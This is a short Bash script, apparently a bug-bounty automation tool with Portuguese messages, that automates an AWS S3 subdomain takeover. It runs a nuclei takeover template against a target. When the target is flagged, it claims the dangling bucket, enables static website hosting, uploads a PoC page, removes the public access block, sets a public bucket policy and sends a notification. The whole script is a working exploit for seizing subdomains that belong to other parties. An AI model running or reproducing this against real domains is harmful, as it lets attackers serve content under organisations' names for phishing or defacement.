
#!/bin/bash
alvo="$1"



bucket=$(echo "$alvo" | nuclei -t /root/nuclei-templates/http/takeovers/aws-bucket-takeover.yaml | awk '{print $5}' | sed 's/.//' | sed 's/.$//' | sed 's/ //g')

if [ "$bucket" != '' ]; then
createbucket=$(aws s3api create-bucket --bucket "$alvo" --region us-east-1)

echo "saidacreatebucket $createbucket"

sleep 10;

echo "etapa configurando  site estatico"
siteestatico=$(aws s3 website s3://"$alvo"/ --index-document index.html --error-document error.html)

sleep 10;

echo "etapa copiando a poc "
cppoc=$(aws s3 cp index.html s3://"$alvo"/)


echo "etapa desbloqueando bucket"
desbloqueandobucket=$(aws s3api put-public-access-block     --bucket "$alvo"  --public-access-block-configuration "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false")

echo "etapa criando policita de objeto"
sed -i  "s/alvo/$alvo/g" policytakeoveraws.json
politicadeobjeto=$(aws s3api put-bucket-policy --bucket "$alvo" --policy file://policytakeoveraws.json)


echo "subdomain takeover em $bucket" | notify

else

exit 0

fi
